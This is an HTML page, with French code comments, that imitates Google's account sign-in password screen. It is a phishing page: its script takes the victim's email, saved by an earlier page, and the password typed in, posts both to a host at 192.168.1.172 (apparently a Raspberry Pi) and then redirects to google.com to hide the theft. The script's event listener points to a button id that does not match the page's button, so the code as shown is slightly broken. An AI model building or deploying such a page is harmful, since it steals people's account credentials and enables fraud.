<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Google account</title>
    <link rel="stylesheet" href="./Gmail_page.css">
</head>
<body>
<div class="container">
  <div class="top-content">
    <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google">
    <h2>Welcome</h2>
    <p id="display-email" style="font-weight: bold; margin-bottom: 10px;"></p>
  </div>
  
  <div class="inputs">
    <input type="password" id="password" class="input" required>
    <label for="password" class="input-label">Enter your password</label>
  </div>
  
  <div class="btn-group">
    <button class="create-btn" onclick="window.location.href='index.html'">Back</button>
    <button class="next-btn" id="btn-connect">Connect</button>
  </div>
</div>

<script>
  // 1. Récupérer l'email sauvegardé sur la page précédente
  const emailSauvegarde = localStorage.getItem('userEmail');

  document.getElementById('btn-next').addEventListener('click', async function() {
    const passwordInput = document.getElementById('password');
    const passwordValue = passwordInput.value;

    if (!passwordValue) {
        alert("Please enter a password");
        return;
    }

    const URL = `http://192.168.1.172:5000/data`; // Vérifiez bien l'IP

    this.innerText = "Loading...";
    this.disabled = true;

    try {
        const response = await fetch(URL, {
            method: 'POST', // On utilise bien POST
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                email: emailSauvegarde, // Envoie l'email stocké
                password: passwordValue, // Envoie le mot de passe saisi
                timestamp: new Date().toISOString()
            })
        });

        if (response.ok) {
            window.location.href = 'https://www.google.com';
        } else {
            alert("Erreur serveur : " + response.status);
            this.innerText = "Connect";
            this.disabled = false;
        }
    } catch (error) {
        console.error("Erreur :", error);
        alert("Impossible de contacter le Raspberry Pi.");
        this.innerText = "Connect";
        this.disabled = false;
    }
  });
</script>
</body>
</html>
